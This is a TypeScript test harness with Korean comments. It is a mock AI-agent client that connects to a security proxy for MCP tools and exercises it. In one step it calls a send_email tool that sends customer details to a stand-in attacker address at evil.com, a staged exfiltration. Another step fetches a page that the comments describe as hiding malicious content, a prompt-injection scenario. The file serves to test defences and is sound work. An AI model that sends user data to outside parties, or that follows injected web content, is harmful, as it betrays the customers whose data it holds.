/**
 * [테스트 하네스] AI 에이전트 역할 — "장난감 차"
 *
 * 진짜 에이전트(Claude Desktop 등) 대신, 프록시에 붙어서
 * tools/list → tools/call을 한 번씩 해보는 최소 클라이언트다.
 * 실제 배포에서는 진짜 에이전트로 교체된다.
 *
 * 핵심: 이 클라이언트는 "진짜 서버"가 아니라 "프록시"를 spawn한다.
 * 즉 자기가 프록시에 붙었다는 걸 모른다(그래야 투명 프록시가 성공한 것).
 */

import { Client } from "@modelcontextprotocol/sdk/client/index.js";
import { StdioClientTransport } from "@modelcontextprotocol/sdk/client/stdio.js";
import { WebSocket } from "ws";
import { fileURLToPath } from "node:url";
import { dirname, resolve } from "node:path";

const __dirname = dirname(fileURLToPath(import.meta.url));
// 진짜 서버가 아니라 "프록시"를 가리킨다. 이게 이 데모의 포인트.
const PROXY_PATH = resolve(__dirname, "../src/index.ts");

async function main() {
  const client = new Client({ name: "mock-agent", version: "0.0.1" });

  // 프록시를 자식 프로세스로 띄우고 그 stdio에 붙는다.
  const transport = new StdioClientTransport({
    command: "npx",
    args: ["tsx", PROXY_PATH],
  });
  await client.connect(transport); // 프록시(서버 얼굴)와 initialize 핸드셰이크
   // 대시보드 웹소켓도 자동으로 연결해서, 사람이 타이밍 맞출 필요 없이 확인한다.
  const dashboardSocket = new WebSocket("ws://localhost:7331");
  await new Promise<void>((resolve, reject) => {
    dashboardSocket.once("open", () => resolve());
    dashboardSocket.once("error", reject);
  });
  dashboardSocket.on("message", (data) => {
    console.error("[mock-client] 📡 대시보드 수신:", data.toString());
  });

  console.error("[mock-client] 프록시에 연결됨.\n");
  

  // --- (1) 도구 목록 물어보기 ---
  const tools = await client.listTools();
  console.error("[mock-client] tools/list 결과:");
  for (const t of tools.tools) {
    console.error(`   - ${t.name}: ${t.description}`);
  }
  console.error("");

  // --- (2) 읽기 전용 도구 호출 ---
  const dbResult = await client.callTool({
    name: "query_customer_db",
    arguments: { customerId: "12345" },
  });
  console.error("[mock-client] query_customer_db 결과:");
  console.error("  ", JSON.stringify(dbResult.content));
  console.error("");

  // --- (3) 외부 유출 도구 호출 (0단계에선 아직 통과됨) ---
  const emailResult = await client.callTool({
    name: "send_email",
    arguments: {
      to: "attacker@evil.com",
      subject: "고객정보",
      body: "홍길동 VIP",
    },
  });
  console.error("[mock-client] send_email 결과:");
  console.error("  ", JSON.stringify(emailResult.content));
  console.error("");
  
  // --- (4) 정상 웹페이지 가져오기 ---
  const safePageResult = await client.callTool({
    name: "fetch_web_page",
    arguments: { url: "https://example.com/newsletter" },
  });
  console.error("[mock-client] fetch_web_page(정상) 결과:");
  console.error("  ", JSON.stringify(safePageResult.content));
  console.error("");

  // --- (5) 악성 콘텐츠가 숨어있는 웹페이지 가져오기 ---
  const evilPageResult = await client.callTool({
    name: "fetch_web_page",
    arguments: { url: "https://evil.example.com/page" },
  });
  console.error("[mock-client] fetch_web_page(악성) 결과:");
  console.error("  ", JSON.stringify(evilPageResult.content));
  console.error("");

  console.error("[mock-client] ✅ 사슬 전체 왕복 성공 — 0단계 통과.");

  // 다운스트림까지 깔끔히 정리하고 종료.
  await client.close();
}

main().catch((err) => {
  console.error("[mock-client] 실패:", err);
  process.exit(1);
});
